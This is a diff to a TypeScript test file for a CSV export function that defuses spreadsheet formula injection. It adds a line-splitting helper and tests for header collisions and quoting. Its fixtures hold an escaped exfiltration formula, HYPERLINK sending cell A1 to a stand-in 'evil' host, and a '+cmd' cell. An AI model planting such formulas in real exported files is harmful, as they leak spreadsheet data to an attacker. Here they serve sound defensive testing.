@@ -22,6 +22,10 @@ describe("neutralizeCsvFormula", () => {
 	});
 });
 
+function csvLines(csv: string) {
+	return csv.split("\n").filter((line) => line !== "");
+}
+
 describe("dataframeToSafeCSV", () => {
 	it("neutralizes formula cells and headers and drops the internal id", () => {
 		const table = aq
@@ -32,13 +36,11 @@ describe("dataframeToSafeCSV", () => {
 			})
 			.derive({ [ARQUERO_INTERNAL_ID]: () => aq.op.row_number() });
 
-		expect(dataframeToSafeCSV(table)).toBe(
-			[
-				"name,'@header,amount",
-				`"'=HYPERLINK(""https://evil/?""&A1,""click"")",'+cmd,-5`,
-				"Alice,ok,10",
-			].join("\n"),
-		);
+		expect(csvLines(dataframeToSafeCSV(table))).toEqual([
+			"name,'@header,amount",
+			`"'=HYPERLINK(""https://evil/?""&A1,""click"")",'+cmd,-5`,
+			"Alice,ok,10",
+		]);
 	});
 
 	it("respects the table ordering", () => {
@@ -47,6 +49,24 @@ describe("dataframeToSafeCSV", () => {
 			.orderby("v")
 			.derive({ [ARQUERO_INTERNAL_ID]: () => aq.op.row_number() });
 
-		expect(dataframeToSafeCSV(table)).toBe(["v", "'-a", "b"].join("\n"));
+		expect(csvLines(dataframeToSafeCSV(table))).toEqual(["v", "'-a", "b"]);
+	});
+
+	it("keeps columns whose escaped headers would collide", () => {
+		const table = aq.table({ "=total": [7], "'=total": [9] });
+
+		expect(csvLines(dataframeToSafeCSV(table))).toEqual([
+			"'=total,'=total",
+			"7,9",
+		]);
+	});
+
+	it("quotes escaped headers that need CSV quoting", () => {
+		const table = aq.table({ '=a,"b"': ["x"] });
+
+		expect(csvLines(dataframeToSafeCSV(table))).toEqual([
+			`"'=a,""b"""`,
+			"x",
+		]);
 	});
 });
